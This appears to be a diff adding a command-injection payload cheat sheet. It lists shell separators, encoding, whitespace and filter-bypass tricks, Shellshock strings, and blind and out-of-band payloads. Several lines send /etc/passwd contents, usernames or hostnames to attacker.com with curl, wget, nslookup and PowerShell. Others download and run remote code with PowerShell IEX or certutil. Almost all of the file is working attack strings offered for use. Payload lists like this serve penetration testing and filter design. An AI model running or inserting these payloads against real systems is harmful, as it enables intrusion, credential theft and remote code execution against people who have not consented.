@@ -1,0 +1,212 @@
+# COMMAND SEPARATORS
+;          
+&          
+&&     
+|      
+||     
+`         
+%0a       
+%0d        
+%0d%0a  
+%1a        
+%00    
+\r\n  
+# CHAINING OPERATORS
+command1 ; command2   
+command1 & command2   
+command1 | command2   
+command1 || command2  
+command1 && command2 
+# COMMAND SUBSTITUTION
+$(command)    
+`command`     
+%24(command)  
+;echo $(whoami)
+';echo `ls`;'
+| echo %PATH%
+# ENVIRONMENT VARIABLES
+${ENV:VAR}
+%ENV_VAR%      
+${PATH:0:3}
+;cat /etc/$PATH/passwd
+& echo %USERNAME%
+# ENCODING TECHNIQUES
+# Base64
+echo d2hvYW1p | base64 -d | sh 
+echo whoami | base64 
+
+# Hex
+echo 77686f616d69 | xxd -r -p | bash  # Linux
+printf\x20\x2F\x63\x0A | sh
+
+# URL
+%63%61%74%20%2F%65%74%63%2F%70%61%73%73%77%64  # cat /etc/passwd
+# WHITESPACE BYPASS
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+X=$'cat\x20/etc/passwd'&&$X
+%09
+%0b
+%0c
+# CASE MANIPULATION
+WhOaMi
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+`echo "wHoAmI" | tr '[:upper:]' '[:lower:]'`
+# STRING CONCATENATION
+w'h'o'a'm'i
+"w"h"o"a"m"i
+w"h"o"a"m"i
+w\ho\am\i
+c"at" /e"tc"/pa"ss"wd
+# COMMENTS FOR BYPASS
+whoami #   
+dir & rem         
+whoami /* comment */
+| whoami <!--
+
+# TIME-BASED DETECTION
+# Linux
+sleep 5
+ping -c 5 127.0.0.1
+$(sleep 5)
+
+# Windows
+timeout 5
+ping -n 5 127.0.0.1
+powershell -c "Start-Sleep 5"
+
+# OOB (OUT-OF-BAND) TECHNIQUES
+# Linux
+curl http://attacker.com/$(whoami)
+nslookup $(hostname).attacker.com
+wget http://attacker.com/?data=`cat /etc/passwd | base64`
+
+# Windows
+curl http://attacker.com/%USERNAME%
+powershell -c "Invoke-WebRequest attacker.com?data=$(whoami)"
+nslookup %COMPUTERNAME%.attacker.com
+
+# FILE SYSTEM COMMANDS
+# Linux (Read-only)
+cat /etc/passwd
+ls -l /home
+cat /proc/self/environ
+find / -name *.conf 2>/dev/null
+
+# Windows (Read-only)
+type C:\Windows\win.ini
+dir C:\Users\
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+
+# SYSTEM INFO COMMANDS
+# Linux
+uname -a
+ifconfig
+cat /etc/issue
+df -h
+
+# Windows
+systeminfo
+ipconfig /all
+ver
+set
+
+# USER CONTEXT COMMANDS
+# Linux
+whoami
+id
+groups
+last
+
+# Windows
+whoami
+net user
+net user %USERNAME%
+net localgroup
+
+# NETWORK COMMANDS
+
+# Linux
+netstat -antup
+arp -a
+route -n
+ss -tulpn
+
+# Windows
+netstat -ano
+arp -a
+route print
+net share
+
+# BLIND INJECTION PAYLOADS
+
+# Boolean-based
+; test -f /etc/passwd && curl attacker.com/exists
+| if exist C:\Windows\System32\cmd.exe (curl attacker.com/exists)
+
+# Error-based
+; cat /nonexistent 2>&1 | curl -X POST --data-binary @- attacker.com
+& type C:\nonexistent.txt 2>&1 | powershell Invoke-WebRequest attacker.com -Method POST -Body $_
+# SHELLSHOCK EXPLOITS
+() { :;}; echo vulnerable
+() { :;}; /usr/bin/curl attacker.com
+() { :;}; /bin/bash -c 'echo exploited'
+
+# WINDOWS-SPECIFIC TRICKS
+# PowerShell
+powershell -c "Get-Process"
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
+
+# WMIC
+wmic process list brief
+wmic /node:localhost process call create "calc.exe"
+
+# CertUtil
+certutil -urlcache -split -f http://attacker.com/malicious.exe
+certutil -encode malicious.exe encoded.txt && type encoded.txt | findstr /V "CERTIFICATE"
+
+# LINUX-SPECIFIC TRICKS
+# Wildcards
+cat /e??/p?ss??
+/bin/ls /et?/passw?
+
+# Command Globbing
+/???/??t /???/??ss??
+/bin/cat /e' 'tc/passwd
+
+# Environment Variables
+${PWD:0:1}${PWD:0:1} -l  # // -l (root directory list)
+
+# FILTER BYPASS TECHNIQUES
+
+# Blacklist bypass
+wh\o\am\i
+who"am"i
+w'h'o'a'm'i
+who$(echo am)i
+whoam''i
+
+# SQL-like bypass
+SEL'ECT' --> who'ami
+UNI/**/ON --> cat /etc/passwd
+
+# Hex/Octal escape
+whoami --> \who\ami
+cat /etc/passwd --> \143\141\164 /etc/passwd
+
+# POLYGLOT PAYLOADS
+# Works in both OS contexts
+echo ';test=`uname -a || ver`; curl attacker.com/$test;'
+powershell -c "if ($?) { Invoke-WebRequest attacker.com/success }"
+
+# SAFE DETECTION COMMANDS
+# Cross-platform
+echo SUCCESS
+ping -c 1 127.0.0.1 || ping -n 1 127.0.0.1
+curl -h || powershell -c "Invoke-WebRequest -UseBasicParsing attacker.com"
+
+# AUTOMATED TESTING PAYLOADS
+# Replace [DOMAIN] with your server
+; curl http://[DOMAIN]?$(hostname)
+| nslookup $(whoami).[DOMAIN]
+& powershell -c "Resolve-DnsName -Name $env:USERNAME.[DOMAIN]"
